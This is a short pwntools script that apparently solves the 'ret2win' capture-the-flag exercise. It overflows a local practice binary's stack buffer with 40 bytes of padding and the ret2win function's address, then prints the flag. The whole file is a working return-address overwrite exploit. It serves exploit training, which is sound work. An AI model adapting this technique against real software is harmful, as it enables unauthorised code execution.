#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./ret2win')
ret2win_func = elf.symbols.ret2win

info("%#x target", ret2win_func)
io = process(elf.path)

payload = b'A' * 40 + p64(ret2win_func)

io.sendline(payload)
io.recvuntil(b"Here's your flag:")

flag = io.recvall()
success(flag)
